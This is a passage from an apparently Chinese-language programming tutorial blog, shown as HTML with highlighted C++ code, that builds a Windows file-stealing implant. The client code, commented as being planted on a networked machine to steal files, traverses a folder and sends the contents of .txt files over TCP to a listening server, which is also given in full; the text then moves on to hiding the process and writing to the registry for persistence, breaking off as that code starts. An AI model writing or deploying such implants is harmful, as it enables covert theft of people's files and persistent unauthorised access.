class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> WIN32_FIND_DATAA WIN32_FIND_DATA;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_WIN32_FIND_DATAA</span> &#123;</span><br><span class="line">    DWORD dwFileAttributes;        <span class="comment">//文件属性</span></span><br><span class="line">    FILETIME ftCreationTime;    <span class="comment">//创建时间</span></span><br><span class="line">    FILETIME ftLastAccessTime;    <span class="comment">//最后访问时间</span></span><br><span class="line">    FILETIME ftLastWriteTime;    <span class="comment">//最后写时间</span></span><br><span class="line">    DWORD nFileSizeHigh;        <span class="comment">//文件大小的高位</span></span><br><span class="line">    DWORD nFileSizeLow;            <span class="comment">//文件大小的地位</span></span><br><span class="line">    DWORD dwReserved0;            <span class="comment">//保留字段</span></span><br><span class="line">    DWORD dwReserved1;            <span class="comment">//保留字段</span></span><br><span class="line">    _Field_z_ CHAR   cFileName[ MAX_PATH ];        <span class="comment">//文件名</span></span><br><span class="line">    _Field_z_ CHAR   cAlternateFileName[ <span class="number">14</span> ];    <span class="comment">//改变后的文件名</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="5-1-1-客户端Client实现"><a href="#5-1-1-客户端Client实现" class="headerlink" title="5.1.1 客户端Client实现"></a>5.1.1 客户端Client实现</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;WinSock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:4996)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">DoSteal</span><span class="params">(<span class="type">const</span> <span class="type">char</span>*)</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">SendtoServer</span><span class="params">(<span class="type">const</span> <span class="type">char</span>*)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ErrorHandling</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* message, <span class="type">int</span> ERRNO)</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">getCurrentTimeStr</span><span class="params">(<span class="type">char</span>* strtime)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">*该程序被植入到某联网机器中用于窃取文件</span></span><br><span class="line"><span class="comment">*1.搜索被窃取的文件</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;TCP Client\n&quot;</span>);</span><br><span class="line">    <span class="comment">//窃取文件</span></span><br><span class="line">    <span class="type">int</span> ret_steal = <span class="built_in">DoSteal</span>(<span class="string">&quot;E:\\About Chase\\Art of Programming-2024\\CPP\\test_f&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">DoSteal</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* szPATH)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//1 遍历文件夹</span></span><br><span class="line">    WIN32_FIND_DATA FindFileData;<span class="comment">//表示文件</span></span><br><span class="line">    HANDLE hListFile;<span class="comment">//文件用句柄来标识和编号</span></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> szFilePath[MAX_PATH] = &#123; <span class="number">0</span> &#125;;<span class="comment">//MAX_PATH=260 Windows下的宏，win下最大文件路径长度</span></span><br><span class="line">    <span class="built_in">strcpy</span>(szFilePath, szPATH);</span><br><span class="line">    <span class="built_in">strcat</span>(szFilePath, <span class="string">&quot;\\*&quot;</span>);<span class="comment">//字符串拼接</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        FindFirstFileA(	//LP标识指针</span></span><br><span class="line"><span class="comment">            _In_ LPCSTR lpFileName,//入参：路径</span></span><br><span class="line"><span class="comment">            _Out_ LPWIN32_FIND_DATAA lpFindFileData	//输出</span></span><br><span class="line"><span class="comment">        );</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="comment">//2 首先找到第一个文件,为 hListFile赋值</span></span><br><span class="line">    hListFile = <span class="built_in">FindFirstFile</span>(szFilePath, &amp;FindFileData);</span><br><span class="line">    <span class="comment">//循环遍历所有文件</span></span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">char</span> mypath[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        <span class="built_in">strcpy</span>(mypath, szPATH);</span><br><span class="line">        <span class="built_in">strcat</span>(mypath, <span class="string">&quot;\\&quot;</span>);</span><br><span class="line">        <span class="built_in">strcat</span>(mypath, FindFileData.cFileName);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;FileName:%s\n&quot;</span>, mypath);</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strstr</span>(mypath, <span class="string">&quot;.txt&quot;</span>))<span class="comment">//只截取txt文件</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">SendtoServer</span>(mypath);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (<span class="built_in">FindNextFile</span>(hListFile, &amp;FindFileData));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">SendtoServer</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* path)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//1 初始化网络库</span></span><br><span class="line">    WSADATA wsaData;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">WSAStartup</span>(<span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData) != <span class="number">0</span>)<span class="comment">//2 2 表示WinSock2.h的二版本</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">ErrorHandling</span>(<span class="string">&quot;WSAStartup() error!&quot;</span>, <span class="built_in">WSAGetLastError</span>());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">LOBYTE</span>(wsaData.wVersion) != <span class="number">2</span> || <span class="built_in">HIBYTE</span>(wsaData.wVersion) != <span class="number">2</span>)<span class="comment">//2表示WinSock2.h的二版本</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">WSACleanup</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> ch[<span class="number">64</span>] = &#123; <span class="number">0</span> &#125;;<span class="comment">//存储时间</span></span><br><span class="line">    <span class="type">char</span> sendBuf[<span class="number">1024</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//2 初始化套接字</span></span><br><span class="line">    SOCKET  sock_cli = <span class="built_in">socket</span>(AF_INET, SOCK_STREAM, <span class="number">0</span>);<span class="comment">//TCP ipv4</span></span><br><span class="line">    <span class="keyword">if</span> (sock_cli == INVALID_SOCKET)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">ErrorHandling</span>(<span class="string">&quot;Server socket errno: %d\n&quot;</span>, <span class="built_in">WSAGetLastError</span>());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//3 准备发送地址和端口</span></span><br><span class="line">    SOCKADDR_IN addrServ;</span><br><span class="line">    <span class="type">int</span> szAddrServ = <span class="built_in">sizeof</span>(addrServ);</span><br><span class="line">    <span class="built_in">memset</span>(&amp;addrServ, <span class="number">0</span>, <span class="built_in">sizeof</span>(addrServ));</span><br><span class="line"></span><br><span class="line">    addrServ.sin_family = AF_INET;</span><br><span class="line">    addrServ.sin_addr.S_un.S_addr = <span class="built_in">inet_addr</span>(<span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line">    addrServ.sin_port = <span class="built_in">htons</span>(<span class="number">44444</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//4 connect</span></span><br><span class="line">    <span class="built_in">getCurrentTimeStr</span>(ch);<span class="comment">//将当前时间存入ch</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Begin connect %s\n&quot;</span>, ch);</span><br><span class="line">    <span class="keyword">if</span> (SOCKET_ERROR == <span class="built_in">connect</span>(sock_cli, (sockaddr*)&amp;addrServ, <span class="built_in">sizeof</span>(addrServ)))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">ErrorHandling</span>(<span class="string">&quot;Server socket errno: %d\n&quot;</span>, <span class="built_in">WSAGetLastError</span>());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//5 读取文件内容到buffer</span></span><br><span class="line">    FILE* fp = <span class="built_in">fopen</span>(path, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="type">int</span> len = <span class="built_in">fread</span>(sendBuf, <span class="number">1</span>, <span class="number">1024</span>, fp);</span><br><span class="line">    <span class="built_in">fclose</span>(fp);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//6 发送数据</span></span><br><span class="line">    <span class="type">int</span> strLen = <span class="built_in">sendto</span>(sock_cli, sendBuf, <span class="built_in">strlen</span>(sendBuf) + <span class="number">1</span>, <span class="number">0</span>, (sockaddr*)&amp;addrServ, szAddrServ);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;After send %d\n&quot;</span>, strLen);</span><br><span class="line">    <span class="keyword">if</span> (strLen == <span class="number">-1</span>)</span><br><span class="line">        <span class="built_in">ErrorHandling</span>(<span class="string">&quot;send error!&quot;</span>, <span class="built_in">WSAGetLastError</span>());</span><br><span class="line"></span><br><span class="line">    <span class="built_in">getCurrentTimeStr</span>(ch);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;After send: %s\n&quot;</span>, ch);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//5 关闭套接字</span></span><br><span class="line">    <span class="built_in">closesocket</span>(sock_cli);</span><br><span class="line">    <span class="comment">//6 终止套接字</span></span><br><span class="line">    <span class="built_in">WSACleanup</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">getCurrentTimeStr</span><span class="params">(<span class="type">char</span>* strtime)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 基于当前系统的当前日期/时间</span></span><br><span class="line">    <span class="type">time_t</span> now = <span class="built_in">time</span>(<span class="literal">NULL</span>);</span><br><span class="line">    tm* ltm = <span class="built_in">localtime</span>(&amp;now);</span><br><span class="line">    <span class="built_in">sprintf</span>(strtime, <span class="string">&quot;%2d:%2d:%2d&quot;</span>, ltm-&gt;tm_hour, ltm-&gt;tm_min, ltm-&gt;tm_sec);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ErrorHandling</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* message, <span class="type">int</span> ERRNO)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">fputs</span>(message, stderr);</span><br><span class="line">    <span class="built_in">fputc</span>(<span class="string">&#x27;\n&#x27;</span>, stderr);</span><br><span class="line">    <span class="type">char</span> ch[<span class="number">64</span>];</span><br><span class="line">    <span class="built_in">getCurrentTimeStr</span>(ch);</span><br><span class="line">    <span class="comment">//printf(&quot;Error num = %d, Error time %s\n&quot;, ::GetLastError(), ch);</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Error num = %d, Error time %s\n&quot;</span>, ERRNO, ch);</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="5-1-2-服务端实现"><a href="#5-1-2-服务端实现" class="headerlink" title="5.1.2 服务端实现"></a>5.1.2 服务端实现</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;WinSock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:4996)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_SIZE 1024</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">getCurrentTimeStr</span><span class="params">(<span class="type">char</span>* strtime)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ErrorHandling</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* message, <span class="type">int</span> ERRNO)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;TCP Server\n&quot;</span>);</span><br><span class="line">    <span class="comment">//1 初始化网络库</span></span><br><span class="line">    WSADATA wsaData;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">WSAStartup</span>(<span class="built_in">MAKEWORD</span>(<span class="number">1</span>, <span class="number">1</span>), &amp;wsaData) != <span class="number">0</span>)<span class="comment">//2表示WinSock2.h的二版本</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">ErrorHandling</span>(<span class="string">&quot;WSAStartup() error!&quot;</span>, <span class="built_in">WSAGetLastError</span>());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">LOBYTE</span>(wsaData.wVersion) != <span class="number">1</span> || <span class="built_in">HIBYTE</span>(wsaData.wVersion) != <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">WSACleanup</span>();</span><br><span class="line">        <span class="built_in">ErrorHandling</span>(<span class="string">&quot;LOBYTE() error!&quot;</span>, <span class="built_in">WSAGetLastError</span>());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> ch[<span class="number">64</span>] = &#123; <span class="number">0</span> &#125;;<span class="comment">//存储时间</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//2 创建socket</span></span><br><span class="line">    SOCKET  sockServ = <span class="built_in">socket</span>(AF_INET, SOCK_STREAM, <span class="number">0</span>);<span class="comment">//udp ipv4</span></span><br><span class="line">    <span class="keyword">if</span> (sockServ == INVALID_SOCKET)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">ErrorHandling</span>(<span class="string">&quot;Server socket Error!&quot;</span>, <span class="built_in">WSAGetLastError</span>());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//3 bind 分配地址和端口</span></span><br><span class="line">    SOCKADDR_IN addrServ, addrClient;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;addrServ, <span class="number">0</span>, <span class="built_in">sizeof</span>(addrServ));</span><br><span class="line">    <span class="built_in">memset</span>(&amp;addrClient, <span class="number">0</span>, <span class="built_in">sizeof</span>(addrClient));</span><br><span class="line">    <span class="type">int</span> szAddrCnt = <span class="built_in">sizeof</span>(addrClient);</span><br><span class="line"></span><br><span class="line">    addrServ.sin_family = AF_INET;</span><br><span class="line">    addrServ.sin_addr.S_un.S_addr = <span class="built_in">htonl</span>(INADDR_ANY);</span><br><span class="line">    addrServ.sin_port = <span class="built_in">htons</span>(<span class="number">44444</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (SOCKET_ERROR == <span class="built_in">bind</span>(sockServ, (sockaddr*)&amp;addrServ, <span class="built_in">sizeof</span>(addrServ)))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">ErrorHandling</span>(<span class="string">&quot;Bind ERROR&quot;</span>, <span class="built_in">WSAGetLastError</span>());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//4 listen</span></span><br><span class="line">    <span class="keyword">if</span> (SOCKET_ERROR == <span class="built_in">listen</span>(sockServ, <span class="number">5</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">ErrorHandling</span>(<span class="string">&quot;listen ERROR&quot;</span>, <span class="built_in">WSAGetLastError</span>());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//3 等待收发数据【阻塞】[直接接到服务端socket]</span></span><br><span class="line">    <span class="type">char</span> recvBuf[MAX_SIZE] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="type">int</span> strLen = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        SOCKET client = <span class="built_in">accept</span>(sockServ, (sockaddr*)&amp;addrClient, &amp;szAddrCnt);</span><br><span class="line">        <span class="keyword">if</span> (SOCKET_ERROR == client)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">ErrorHandling</span>(<span class="string">&quot;accept ERROR&quot;</span>, <span class="built_in">WSAGetLastError</span>());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">memset</span>(recvBuf, <span class="number">0</span>, MAX_SIZE);</span><br><span class="line">        <span class="keyword">while</span> ((strLen = <span class="built_in">recv</span>(client, recvBuf, MAX_SIZE, <span class="number">0</span>)) != <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Server message: %s\n&quot;</span>, recvBuf);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">closesocket</span>(client);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//7 关闭总机</span></span><br><span class="line">    <span class="built_in">closesocket</span>(sockServ);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">getCurrentTimeStr</span><span class="params">(<span class="type">char</span>* strtime)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 基于当前系统的当前日期/时间</span></span><br><span class="line">    <span class="type">time_t</span> now = <span class="built_in">time</span>(<span class="literal">NULL</span>);</span><br><span class="line">    tm* ltm = <span class="built_in">localtime</span>(&amp;now);</span><br><span class="line">    <span class="built_in">sprintf</span>(strtime, <span class="string">&quot;%2d:%2d:%2d&quot;</span>, ltm-&gt;tm_hour, ltm-&gt;tm_min, ltm-&gt;tm_sec);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ErrorHandling</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* message, <span class="type">int</span> ERRNO)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">fputs</span>(message, stderr);</span><br><span class="line">    <span class="built_in">fputc</span>(<span class="string">&#x27;\n&#x27;</span>, stderr);</span><br><span class="line">    <span class="type">char</span> ch[<span class="number">64</span>];</span><br><span class="line">    <span class="built_in">getCurrentTimeStr</span>(ch);</span><br><span class="line">    <span class="comment">//printf(&quot;Error num = %d, Error time %s\n&quot;, ::GetLastError(), ch);</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Error num = %d, Error time %s\n&quot;</span>, ERRNO, ch);</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意：</p><ul><li><code>&lt;windows.h&gt;</code> 与<code>&lt;WinSock2.h&gt;</code> 相互冲突</li><li><code>printf</code> 输出可能会因为缓存卡在某处，推荐使用<code>fputs</code>或<code>Linux</code></li></ul><blockquote><p><code>printf</code> 与 <code>fputs</code>的区别：</p><ol><li><code>puts()</code>显示字符串时自动在其后添加一个换行符，函数里的参数是一个地址，从该地址向后面输出，直到遇到空字符，所以要确保输出的字符串里要有空字符。与<code>gets()</code>函数一起使用。</li><li><code>fputs()</code>需要第二个参数来说明要写的文件，与<code>puts()</code>不同，<code>fputs()</code>不为输出自动添加换行符。与<code>fgets()</code>一起使用。</li><li><code>printf()</code>格式化输入输出，与<code>gets()</code>函数一致需要一个字符串地址作为参数。</li></ol></blockquote><p>总结：</p><ol><li><p>只要是文件遍历，我们要立马想到<code>WIN32_FIND_DATA</code>结构体，其包含文件名和文件信息、创建时间、访问时间等</p></li><li><p>句柄 — 即指针，用来表示windows下面的一些对象</p></li><li><p>MAX_PATH 涉及到windows路径的数组变量 260</p></li><li><p>禁用特定警告4996</p></li><li><p>怎么样隐藏自身【<code>5.2</code>节】</p></li><li><p>怎么样写入到注册表 【<code>5.2</code>节】</p></li><li><p>错误处理函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">ErrorHanding</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">fputs</span>(msg, stderr);</span><br><span class="line">  <span class="built_in">fputc</span>(<span class="string">&#x27;\n&#x27;</span>, stderr);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><br><h3 id="5-2-隐藏进程与修改注册表"><a href="#5-2-隐藏进程与修改注册表" class="headerlink" title="5.2 隐藏进程与修改注册表"></a>5.2 隐藏进程与修改注册表</h3><p>对客户端的优化：写入注册表</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 